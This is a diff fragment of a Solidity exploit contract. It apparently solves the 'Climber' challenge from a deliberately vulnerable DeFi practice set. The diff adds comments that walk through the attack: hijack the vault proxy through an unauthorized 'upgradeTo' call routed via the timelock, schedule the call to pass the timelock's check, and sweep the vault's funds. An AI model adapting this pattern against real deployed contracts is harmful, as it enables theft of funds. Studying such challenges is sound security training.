@@ -191,17 +191,17 @@ contract Exploiter is Test, UUPSUpgradeable {
             address(this)
         );
 
-        //2.
+        //2. Upgrade implementation contract to this
         targets[1] = address(climberVaultProxy);
         values[1] = 0;
-        data[1] = abi.encodeWithSelector(hex"3659cfe6", address(this));
+        data[1] = abi.encodeWithSignature("upgradeTo(address)", address(this));
 
-        //3.
+        //3. Make sure schedule() is called so that ClimberTimelock:114 doesn't mess this up
         targets[2] = address(this);
         values[2] = 0;
         data[2] = abi.encodeWithSignature("attackSchedule()");
 
-        //4.
+        //4. Sweep the proxy
         targets[3] = address(climberVaultProxy);
         values[3] = 0;
         data[3] = abi.encodeWithSignature(
